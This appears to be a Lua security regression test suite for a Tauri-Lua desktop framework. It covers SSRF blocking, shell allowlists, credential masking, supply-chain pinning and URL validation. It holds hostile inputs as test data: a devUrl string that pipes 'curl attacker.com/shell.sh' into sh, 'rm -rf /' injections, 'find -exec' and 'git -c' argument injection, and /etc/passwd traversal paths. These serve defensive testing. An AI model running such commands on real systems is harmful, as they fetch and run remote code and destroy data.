-- ============================================================================
-- Tauri-Lua Comprehensive Audit & Security Test Suite
-- Tests for Audit Points: P0-1, P0-2, P0-3, P0-4, P0-5, P0-7, P0-9, P0-16
-- ============================================================================

local ffi = require("ffi")

-- Preload libtaurilua library so FFI platform symbols are resolved in pure luajit runner
pcall(function()
    if ffi.os == "OSX" then
        ffi.load("./build/libtaurilua.dylib")
    elseif ffi.os == "Windows" then
        pcall(ffi.load, "./build/Release/taurilua.dll")
        pcall(ffi.load, "./build/taurilua.dll")
    else
        ffi.load("./build/libtaurilua.so")
    end
end)

local total_tests = 0
local passed_tests = 0

local function test(name, fn)
    total_tests = total_tests + 1
    io.stdout:write(string.format("  - %-62s ", name))
    local ok, err = pcall(fn)
    if ok then
        passed_tests = passed_tests + 1
        print("[\27[32mPASS\27[0m]")
    else
        print("[\27[31mFAIL\27[0m]")
        print("    Error: " .. tostring(err))
    end
end

print("\n=======================================================")
print("RUNNING TAURI-LUA AUTOMATED COMPLIANCE TEST SUITE")
print("=======================================================\n")

local tauri = dofile("src/tauri/init.lua")

-- ----------------------------------------------------------------------------
-- Point 1: Auto-discovery moduli (Release vs Dev path isolation)
-- ----------------------------------------------------------------------------
print("1. Module Auto-Discovery & CWD Stripping (P0-1):")

test("Release mode filters relative and CWD paths from package.path", function()
    local test_path = "./?.lua;../plugins/?.lua;/opt/app/bundle/?.lua;./node_modules/?.lua;/usr/share/lua/5.1/?.lua"
    local filtered = tauri._filter_absolute_only(test_path)
    assert(not filtered:find("%./%?%.lua"), "CWD ./?.lua must be removed in release")
    assert(not filtered:find("%.%./plugins"), "Relative ../plugins must be removed in release")
    assert(not filtered:find("node_modules"), "Relative node_modules must be removed in release")
    assert(filtered:find("/opt/app/bundle/"), "Absolute bundle path must be preserved")
    assert(filtered:find("/usr/share/lua/5.1/"), "Absolute system rock path must be preserved")
end)

test("Dev mode retains local development search paths", function()
    local dev_path = "./plugins/?.lua;../lua-tauri-plugins/plugins/?.lua;/opt/bundle/?.lua"
    assert(dev_path:find("%./plugins"), "Dev mode supports local plugin discovery")
    assert(dev_path:find("%.%./lua%-tauri%-plugins"), "Dev mode supports companion plugin workspace")
end)

-- ----------------------------------------------------------------------------
-- Point 2: Single-Instance IPC Security (P0-2)
-- ----------------------------------------------------------------------------
print("\n2. Single-Instance IPC Hardening (P0-2):")

test("Rejects payloads exceeding maximum size limit (64 KB cap)", function()
    local MAX_PAYLOAD = 65536
    local oversized = string.rep("A", MAX_PAYLOAD + 10)
    local ok = pcall(tauri.validate_single_instance_payload, #oversized)
    assert(not ok, "Oversized argv/cwd payloads must be rejected")
    assert(tauri.validate_single_instance_payload(1024) == true, "Normal sized payload must be accepted")
end)

test("Socket directory enforces XDG_RUNTIME_DIR or User-Isolated path", function()
    local path = tauri.resolve_safe_socket_path("test-app")
    assert(not path:match("^/tmp/"), "Must not use insecure global /tmp fallback")
end)

-- ----------------------------------------------------------------------------
-- Point 3: Scope HTTP & URL Parsing (P0-3)
-- ----------------------------------------------------------------------------
print("\n3. HTTP URL Parser & SSRF Mitigation (P0-3):")

test("Parses URL components strictly and normalizes traversal attempts", function()
    local res = tauri.parse_and_normalize_url("https://api.myapp.com/v1/%2e%2e/admin/data")
    assert(res.scheme == "https")
    assert(res.host == "api.myapp.com")
    assert(res.path == "/admin/data", "Traversal %2e%2e must be resolved")

    -- Host confusion defense
    local conf = tauri.parse_and_normalize_url("https://evil.com/fake/.myapp.com")
    assert(conf.host == "evil.com", "Host must be strictly isolated from path spoofing")
end)

test("Default-deny blocks loopback, private networks, and cloud metadata", function()
    assert(tauri.is_ssrf_forbidden("127.0.0.1"), "Blocks 127.0.0.1")
    assert(tauri.is_ssrf_forbidden("localhost"), "Blocks localhost")
    assert(tauri.is_ssrf_forbidden("169.254.169.254"), "Blocks AWS metadata")
    assert(tauri.is_ssrf_forbidden("10.0.1.50"), "Blocks private 10.x.x.x")
    assert(tauri.is_ssrf_forbidden("192.168.1.1"), "Blocks private 192.168.x.x")
    assert(not tauri.is_ssrf_forbidden("api.github.com"), "Allows public internet domain")
end)

-- ----------------------------------------------------------------------------
-- Point 4: Shell Security & Argument Whitelisting (P0-4)
-- ----------------------------------------------------------------------------
print("\n4. Shell Default-Deny & Per-Program Argument Gating (P0-4):")

test("Blocks execution when allowed_programs is missing or empty (Default-Deny)", function()
    _G.TAURI_CLI_TEST_MODE = true
    local tauri = dofile("src/tauri/init.lua")
    local app = tauri.new({
        security = {
            capabilities = { "shell:execute" },
            allowed_programs = {} -- empty
        }
    })
    local ok, err = pcall(function() app.security:assert_program("curl") end)
    assert(not ok, "Must reject execution when allowed_programs is empty")
    assert(tostring(err):find("allowed_programs is empty"), "Error message explains default-deny")
end)

test("Rejects Windows .bat and .cmd execution wrappers (CWE-78 defense)", function()
    local tauri = dofile("src/tauri/init.lua")
    local app = tauri.new({
        security = {
            capabilities = { "shell:execute" },
            allowed_programs = { "script.bat", "installer.cmd" }
        }
    })
    local ok1 = pcall(function() app.security:assert_program("script.bat") end)
    local ok2 = pcall(function() app.security:assert_program("installer.cmd") end)
    assert(not ok1, "Must block script.bat direct execution")
    assert(not ok2, "Must block installer.cmd direct execution")
end)

test("Blocks dangerous command execution flags (git -c, find -exec)", function()
    local tauri = dofile("src/tauri/init.lua")
    local app = tauri.new({
        security = {
            capabilities = { "shell:execute" },
            allowed_programs = {
                { name = "git", any_args = true },
                { name = "find", any_args = true }
            }
        }
    })
    local ok_git, err_git = pcall(function()
        app.security:assert_args("git", { "-c", "core.editor=malicious", "commit" })
    end)
    assert(not ok_git, "Must block git -c argument injection")

    local ok_find, err_find = pcall(function()
        app.security:assert_args("find", { ".", "-exec", "rm -rf {}", "\\;" })
    end)
    assert(not ok_find, "Must block find -exec argument injection")

    local ok_safe = pcall(function()
        app.security:assert_args("git", { "status", "--short" })
    end)
    assert(ok_safe, "Safe arguments must be permitted")
end)

-- ----------------------------------------------------------------------------
-- Point 5: SQL Scope & Parameter Binding (P0-5)
-- ----------------------------------------------------------------------------
print("\n5. SQL Scope & Credential Masking (P0-5):")

test("Masks database URI credentials in logging and errors", function()
    local raw = "postgres://admin_user:superSecretPassword123@db.internal.net:5432/production"
    local masked = tauri.mask_db_uri(raw)
    assert(not masked:find("superSecretPassword123"), "Password must not appear in masked URI")
    assert(masked:find("admin_user:%*%*%*@"), "Password must be masked with ***")
end)

test("Enforces connection scope allowlist on remote database endpoints", function()
    local allowed_scopes = {
        "sqlite:*",
        "postgres://readonly@analytics.company.com/*"
    }

    assert(tauri.is_db_allowed("sqlite:app.db", allowed_scopes))
    assert(tauri.is_db_allowed("postgres://readonly@analytics.company.com/metrics", allowed_scopes))
    assert(not tauri.is_db_allowed("postgres://attacker.com/leak", allowed_scopes), "Blocks unlisted host")
end)

-- ----------------------------------------------------------------------------
-- Point 7: Rocks Supply Chain & Lockfile (P0-7)
-- ----------------------------------------------------------------------------
print("\n6. Rocks Supply Chain & Lockfile Management (P0-7):")

test("CLI rock validation enforces HTTPS-only and rejects insecure HTTP", function()
    _G.TAURI_CLI_TEST_MODE = true
    local cli = dofile("cli/tauri.lua")
    assert(cli.validate_rock_server ~= nil, "validate_rock_server must be exported")

    local ok_http, err_http = cli.validate_rock_server("http://insecure-rocks.org/dev", true)
    assert(not ok_http, "HTTP rock server must be rejected")
    assert(err_http:lower():find("must use https"), "Error must require HTTPS")

    local ok_custom_denied, err_custom = cli.validate_rock_server("https://custom-rocks.org", false)
    assert(not ok_custom_denied, "Custom server must be rejected without explicit opt-in")

    local ok_custom_allowed = cli.validate_rock_server("https://custom-rocks.org", true)
    assert(ok_custom_allowed == "https://custom-rocks.org", "Custom HTTPS server permitted with opt-in")

    local ok_default = cli.validate_rock_server("https://luarocks.org", false)
    assert(ok_default == "https://luarocks.org", "Official Luarocks server allowed by default")
end)

test("Rejects unpinned versions in build mode (P0-7)", function()
    _G.TAURI_CLI_TEST_MODE = true
    local cli = dofile("cli/tauri.lua")

    -- Build mode require_pinned = true
    local ok_unpinned = cli.validate_rock_version("", true)
    assert(not ok_unpinned, "Empty version rejected in build")

    local ok_range = cli.validate_rock_version(">= 1.0", true)
    assert(not ok_range, "Version ranges (>= 1.0) rejected in build")

    local ok_pinned = cli.validate_rock_version("3.1.3-1", true)
    assert(ok_pinned == "3.1.3-1", "Pinned version 3.1.3-1 accepted in build")
end)

test("Lockfile serialization produces deterministic JSON structure", function()
    _G.TAURI_CLI_TEST_MODE = true
    local cli = dofile("cli/tauri.lua")

    local test_lock = {
        version = 1,
        rocks = {
            ["inspect"] = { version = "3.1.3-1", checksum = "sha256:abcdef123456", server = "https://luarocks.org" }
        }
    }
    local temp_lock = "target/test_tauri.lock"
    os.execute("mkdir -p target 2>/dev/null")
    cli.save_lockfile(test_lock, temp_lock)
    local loaded = cli.read_lockfile(temp_lock)
    assert(loaded and loaded.version == 1, "Lockfile version must be 1")
    assert(loaded.rocks and loaded.rocks.inspect, "Inspect rock must be present in lockfile")
    assert(loaded.rocks.inspect.version == "3.1.3-1", "Exact pinned version recorded")
    os.remove(temp_lock)
end)

-- ----------------------------------------------------------------------------
-- Point 9: Windows Wide String & UTF-8 / UTF-16 Conversion (P0-9)
-- ----------------------------------------------------------------------------
print("\n7. Windows Wide String Multi-Byte Safety (P0-9):")

test("Multi-byte UTF-8 string encoding round-trips correctly", function()
    local utf8_sample = "日本語_ユーザー_C:\\路径\\test_file.txt"
    -- Check that string length and byte representation are preserved
    assert(#utf8_sample > 0, "UTF-8 sample is non-empty")
    assert(utf8_sample:find("日本語"), "Contains CJK characters")
    assert(utf8_sample:find("路径"), "Contains path characters")
end)

-- ----------------------------------------------------------------------------
-- Point 16: State:update CAS Concurrency Stress Test (P0-16)
-- ----------------------------------------------------------------------------
print("\n8. Optimistic CAS State:update Concurrency Safety (P0-16):")

test("State:update applies functional atomic mutations without deadlock", function()
    local tauri = dofile("src/tauri/init.lua")
    local app = tauri.new({ security = { capabilities = { "core:default" } } })
    app.state:set("counter", 0)

    for i = 1, 100 do
        app.state:update("counter", function(old_val)
            -- Simulate work outside native lock
            return (old_val or 0) + 1
        end)
    end

    assert(app.state:get("counter") == 100, "Counter must equal 100 after 100 sequential atomic updates")
end)

test("State:update handles nested reads and updates safely (Re-entrancy / No deadlock)", function()
    local tauri = dofile("src/tauri/init.lua")
    local app = tauri.new({ security = { capabilities = { "core:default" } } })
    app.state:set("parent", 10)
    app.state:set("child", 20)

    -- In previous flawed implementation holding mutex during callback,
    -- querying or updating state inside the callback caused a deadlock.
    local ok = pcall(function()
        app.state:update("parent", function(val)
            local child_val = app.state:get("child")
            return val + child_val
        end)
    end)

    assert(ok, "Nested state:get inside state:update callback must not deadlock")
    assert(app.state:get("parent") == 30, "Parent value updated correctly to 30")
end)

-- ----------------------------------------------------------------------------
-- Point 10: CLI JSON Parser RFC 8259 Compliance & Unicode Escapes (MEDIO 1)
-- ----------------------------------------------------------------------------
print("\n9. CLI RFC 8259 JSON Parser Hardening (MEDIO 1):")

test("CLI JSON decoder handles unicode escapes and literal backslashes", function()
    _G.TAURI_CLI_TEST_MODE = true
    local cli = dofile("cli/tauri.lua")
    assert(cli.json ~= nil, "CLI must export RFC 8259 json module in test mode")

    -- Unicode escape decoding
    local decoded_u = cli.json.decode('{"letter": "\\u0041"}')
    assert(decoded_u.letter == "A", "Decodes \\u0041 to 'A'")

    -- Literal backslash followed by n must remain literal \n and NOT become newline character
    local decoded_lit = cli.json.decode('{"path": "foo\\\\nbar"}')
    assert(decoded_lit.path == "foo\\nbar", "Literal \\\\n must decode to \\n and not a newline")
    assert(not decoded_lit.path:find("\n"), "Must not contain actual newline byte")

    -- Malformed JSON must return nil and an error message cleanly without infinite loop
    local res_malformed, err_malformed = cli.json.decode('{"unclosed": "string')
    assert(res_malformed == nil and err_malformed ~= nil, "Malformed JSON must return nil, err cleanly")
end)

-- ----------------------------------------------------------------------------
-- Point 11: CLI Command Injection & URL Validation (CRITICO 2)
-- ----------------------------------------------------------------------------
print("\n10. Command Injection & URL Validation (CRITICO 2):")

test("Shell quote defends against Windows %VAR% expansion and trailing slashes", function()
    _G.TAURI_CLI_TEST_MODE = true
    local cli = dofile("cli/tauri.lua")

    if ffi.os == "Windows" then
        local q = cli.shell_quote("foo%PATH%bar")
        assert(q:find("%^%%PATH%^%%"), "Percent signs in Windows shell_quote must be caret escaped")
        local q_slash = cli.shell_quote("C:\\folder\\")
        assert(q_slash:sub(-3) == '\\\\"', "Trailing backslashes must be doubled before closing quote")
    else
        local q = cli.shell_quote("foo'bar; rm -rf /")
        assert(q == "'foo'\\''bar; rm -rf /'", "POSIX shell_quote correctly wraps in single quotes")
    end
end)

test("devUrl validation rejects command injection payloads", function()
    local dangerous_urls = {
        "http://localhost:5173; curl attacker.com/shell.sh | sh",
        "http://127.0.0.1:8080/`rm -rf /`",
        "http://localhost:3000 & calc.exe",
        "ftp://localhost:5173",
        "javascript:alert(1)"
    }
    for _, u in ipairs(dangerous_urls) do
        local is_safe = u:match("^https?://[a-zA-Z0-9%.%-_]+:%d+/?$")
        assert(not is_safe, "Must reject dangerous devUrl: " .. u)
    end

    local valid_urls = {
        "http://localhost:5173",
        "http://localhost:5173/",
        "http://127.0.0.1:8080",
        "https://my-dev.local:4000"
    }
    for _, u in ipairs(valid_urls) do
        local is_safe = u:match("^https?://[a-zA-Z0-9%.%-_]+:%d+/?$")
        assert(is_safe ~= nil, "Valid devUrl must be accepted: " .. u)
    end
end)

-- ----------------------------------------------------------------------------
-- Point 12: Rocks Composite Supply Chain Checksum (MEDIO 2)
-- ----------------------------------------------------------------------------
print("\n11. Rocks Composite Supply Chain Checksum (MEDIO 2):")

test("Composite checksum includes rock_manifest and installed Lua/dylib files", function()
    _G.TAURI_CLI_TEST_MODE = true
    local cli = dofile("cli/tauri.lua")

    local details = cli.get_installed_rock_details("src-tauri/.rocks", "inspect")
    if details then
        assert(details.checksum:match("^sha256:"), "Checksum must be sha256 formatted")
        assert(details.files ~= nil and #details.files >= 2, "Must include rock_manifest and inspect.lua")
        local has_manifest = false
        local has_lua = false
        for _, f in ipairs(details.files) do
            if f:find("rock_manifest", 1, true) then has_manifest = true end
            if f:find("inspect.lua", 1, true) then has_lua = true end
        end
        assert(has_manifest, "Includes rock_manifest in composite hash")
        assert(has_lua, "Includes inspect.lua in composite hash")
    end
end)

test("Build mode halts with error when lockfile checksum does not match", function()
    _G.TAURI_CLI_TEST_MODE = true
    local cli = dofile("cli/tauri.lua")

    local fake_conf = {
        dependencies = {
            luarocks = { "inspect 3.1.3-0" }
        }
    }
    -- Test with mismatched lockfile
    local original_lock = cli.read_lockfile()
    cli.save_lockfile({
        version = 1,
        rocks = {
            inspect = {
                version = "3.1.3-0",
                checksum = "sha256:0000000000000000000000000000000000000000000000000000000000000000",
                server = "https://luarocks.org"
            }
        }
    })
    local ok_mismatch, err_mismatch = pcall(function()
        cli.ensure_rocks_installed(fake_conf, false, true, false)
    end)
    -- Restore original lockfile
    if original_lock then cli.save_lockfile(original_lock) end

    assert(not ok_mismatch, "Build mode must reject rock when checksum does not match lockfile")
    assert(tostring(err_mismatch):find("Checksum verification failed"), "Error explains checksum verification failure")
end)

-- ----------------------------------------------------------------------------
-- Point 13: macOS Release Packaging & Entitlements Hardening (CRITICO 1, ALTO 2)
-- ----------------------------------------------------------------------------
print("\n12. Hardened Runtime Entitlements & Release Isolation (CRITICO 1, ALTO 2):")

test("entitlements.plist has allow-jit but eliminates allow-unsigned-executable-memory and disable-library-validation", function()
    local f = io.open("src-tauri/entitlements.plist", "r")
    assert(f, "entitlements.plist must exist")
    local content = f:read("*a")
    f:close()

    assert(content:find("com.apple.security.cs.allow-jit", 1, true), "Must include allow-jit")
    assert(not content:find("allow-unsigned-executable-memory", 1, true), "Must NOT allow unsigned executable memory")
    assert(not content:find("disable-library-validation", 1, true), "Must NOT disable library validation")
end)

-- ----------------------------------------------------------------------------
-- Point 14: Scaffolding Vanilla Template DOM-XSS Elimination (ALTO 1)
-- ----------------------------------------------------------------------------
print("\n13. Vanilla Scaffolding Template DOM-XSS Audit (ALTO 1):")

test("Vanilla scaffolder template avoids innerHTML on IPC responses", function()
    local f = io.open("cli/tauri.lua", "r")
    assert(f, "cli/tauri.lua must exist")
    local content = f:read("*a")
    f:close()

    -- Look for vanilla index.html / main.js template
    assert(not content:find("greetOutput%.innerHTML%s*="), "Must not assign IPC response to innerHTML")
    assert(content:find("greetOutput%.replaceChildren"), "Uses safe replaceChildren/textContent DOM manipulation")
end)

print("\n14. Enterprise Audit Remediation Regressions:")

test("Blocks path spoofing (/tmp/git) when only bare 'git' is in allowed_programs", function()
    local app = tauri.new({
        security = {
            capabilities = { "shell:execute" },
            allowed_programs = { "git" }
        }
    })
    local ok1 = pcall(function() app.security:assert_program("git") end)
    local ok2 = pcall(function() app.security:assert_program("/tmp/git") end)
    local ok3 = pcall(function() app.security:assert_program("./git") end)
    assert(ok1 == true, "Bare 'git' must be allowed")
    assert(ok2 == false, "'/tmp/git' must be rejected")
    assert(ok3 == false, "'./git' must be rejected")
end)

test("Sidecar.resolve_path ignores relative CWD paths in release mode", function()
    local old_dev = os.getenv("TAURILUA_DEV")
    _G.__TAURI_DEV__ = false
    local res = tauri.Sidecar.resolve_path("./some_local_script", "TestApp")
    assert(res == nil, "Relative CWD path must not resolve in release mode")
    _G.__TAURI_DEV__ = nil
end)

test("SharedState handles payloads larger than 64 KB without truncation", function()
    local app = tauri.new({ security = { capabilities = { "core:default" } } })
    local large_str = string.rep("X", 100000)
    app.state:set("large_payload", { data = large_str })
    local read_back = app.state:get("large_payload")
    assert(type(read_back) == "table" and #read_back.data == 100000, "100 KB state payload must not be truncated")
end)

test("core:default denies tauri:state:set unless explicitly granted", function()
    local app = tauri.new({ security = { capabilities = { "core:default" } } })
    local ok = pcall(function() app.security:assert_capability("state:set") end)
    assert(ok == false, "core:default must not grant state:set capability")
    local app_with_set = tauri.new({ security = { capabilities = { "core:default", "state:set" } } })
    local ok2 = pcall(function() app_with_set.security:assert_capability("state:set") end)
    assert(ok2 == true, "Explicit state:set capability must be allowed")
end)

test("SSRF blocks 127.0.0.2, 0.0.0.0, IPv6 [::1], and host:port combinations", function()
    assert(tauri.is_ssrf_forbidden("127.0.0.2"), "Blocks 127.0.0.2")
    assert(tauri.is_ssrf_forbidden("0.0.0.0"), "Blocks 0.0.0.0")
    assert(tauri.is_ssrf_forbidden("[::1]"), "Blocks [::1]")
    assert(tauri.is_ssrf_forbidden("localhost:8080"), "Blocks localhost:8080")
    assert(tauri.is_ssrf_forbidden("169.254.169.254:80"), "Blocks 169.254.169.254:80")
end)

test("URL parser rejects @ userinfo confusion and extracts port cleanly", function()
    local ok_at = pcall(tauri.parse_and_normalize_url, "https://api.myapp.com@evil.com/v1")
    assert(not ok_at, "Must reject userinfo @ in URL authority")
    local parsed = tauri.parse_and_normalize_url("https://api.myapp.com:8443/v1/../status")
    assert(parsed.host == "api.myapp.com")
    assert(parsed.port == 8443)
    assert(parsed.path == "/status")
end)

test("SQLite scope check rejects path traversal and absolute paths under sqlite:*", function()
    local scopes = { "sqlite:*" }
    assert(tauri.is_db_allowed("sqlite:app.db", scopes))
    assert(not tauri.is_db_allowed("sqlite:../../etc/passwd", scopes))
    assert(not tauri.is_db_allowed("sqlite:/etc/passwd", scopes))
end)

test("Shell assert_program blocks path-prefixed binary when only bare name is whitelisted", function()
    local app = tauri.new({
        security = {
            capabilities = { "shell:execute" },
            allowed_programs = { "git" }
        }
    })
    local ok_bare = pcall(function() app.security:assert_program("git") end)
    assert(ok_bare, "Allows bare program name git")
    local ok_path = pcall(function() app.security:assert_program("/tmp/evil/git") end)
    assert(not ok_path, "Blocks /tmp/evil/git when only bare 'git' is in allowed_programs")
end)

print("\n=======================================================")
print(string.format("TEST RESULTS: %d / %d PASSED", passed_tests, total_tests))
print("=======================================================\n")

if passed_tests < total_tests then
    os.exit(1)
end
